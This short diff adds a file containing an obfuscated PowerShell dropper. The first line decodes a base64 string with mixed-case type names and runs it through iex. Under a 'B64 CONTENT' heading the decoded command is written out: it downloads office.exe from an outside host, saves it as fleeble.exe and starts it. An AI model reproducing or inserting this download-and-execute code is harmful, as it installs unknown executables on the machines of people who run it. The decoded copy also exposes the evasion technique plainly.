@@ -1,0 +1,7 @@
+iex([sYstEM.TeXT.enCodIng]::uTF8.GETSTRiNG([SysteM.CoNveRT]::fRoMbAse64strINg('CihOZXctT2JqZWN0IHN5c1RlTS5ORVQuV0ViY0xpRW50KS5Eb1dubG9BZGZpbEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vb2ZmaWNlLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sysTeM.NET.WEbcLiEnt).DoWnloAdfilE('http://worldnit.com/office.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
